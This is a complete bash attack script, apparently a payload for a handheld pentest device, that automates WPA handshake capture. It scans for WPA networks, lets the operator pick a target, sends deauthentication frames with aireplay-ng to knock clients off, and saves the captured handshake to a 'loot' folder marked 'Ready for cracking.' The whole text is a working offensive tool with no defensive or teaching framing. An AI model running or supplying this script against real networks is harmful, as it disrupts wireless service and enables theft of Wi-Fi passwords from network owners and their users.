#!/bin/bash
# Title: Handshake Hunter
# Author: bad-antics
# Description: Targeted WPA handshake capture
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "HANDSHAKE HUNTER

Capture WPA handshakes
from a specific network.

Options:
- Passive wait
- Active deauth
- Client-targeted

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

PROMPT "SELECT TARGET:

1. Scan and select
2. Enter BSSID manually

Enter option next."

MODE=$(NUMBER_PICKER "Mode (1-2):" 1)

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Scanning..."
    timeout 10 airodump-ng wlan0 --encrypt wpa --write-interval 1 -w /tmp/hsscan --output-format csv 2>/dev/null
    SPINNER_STOP
    
    NET_COUNT=$(grep -c "WPA" /tmp/hsscan*.csv 2>/dev/null || echo 0)
    PROMPT "Found $NET_COUNT WPA networks"
    
    TARGET_NUM=$(NUMBER_PICKER "Target # (1-$NET_COUNT):" 1)
    
    TARGET_LINE=$(grep "WPA" /tmp/hsscan*.csv 2>/dev/null | sed -n "${TARGET_NUM}p")
    BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
    SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')
else
    BSSID=$(MAC_PICKER "Target BSSID:")
    CHANNEL=$(NUMBER_PICKER "Channel:" 6)
    SSID="target"
fi

PROMPT "CAPTURE METHOD:

1. Passive (wait)
2. Deauth all clients
3. Target specific client

Enter method next."

METHOD=$(NUMBER_PICKER "Method (1-3):" 2)

if [ "$METHOD" -eq 3 ]; then
    CLIENT_MAC=$(MAC_PICKER "Client MAC to deauth:")
fi

DURATION=$(NUMBER_PICKER "Max duration (sec):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

CAP_FILE="$LOOT_DIR/hs_${SSID}_$(date +%Y%m%d_%H%M)"

resp=$(CONFIRMATION_DIALOG "START CAPTURE?

SSID: $SSID
BSSID: $BSSID
Channel: $CHANNEL
Method: $METHOD

Press OK to hunt.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Hunting handshake..."

# Lock channel
iwconfig wlan0 channel $CHANNEL

# Start capture
airodump-ng wlan0 --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
CAP_PID=$!

sleep 3

# Deauth based on method
case $METHOD in
    2) # Deauth all
        for i in 1 2 3; do
            aireplay-ng -0 5 -a "$BSSID" wlan0 2>/dev/null
            sleep 10
            
            # Check for handshake
            if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
                LOG "Handshake captured!"
                break
            fi
        done
        ;;
    3) # Target client
        for i in 1 2 3; do
            aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT_MAC" wlan0 2>/dev/null
            sleep 10
            
            if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
                LOG "Handshake captured!"
                break
            fi
        done
        ;;
    *) # Passive
        sleep $DURATION
        ;;
esac

kill $CAP_PID 2>/dev/null

# Verify handshake
if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
    PROMPT "SUCCESS!

Handshake captured!

SSID: $SSID
File: ${CAP_FILE}.cap

Ready for cracking.
Press OK to exit."
else
    PROMPT "NO HANDSHAKE

Could not capture
handshake for $SSID

Try again with active
deauth or wait longer.

Press OK to exit."
fi
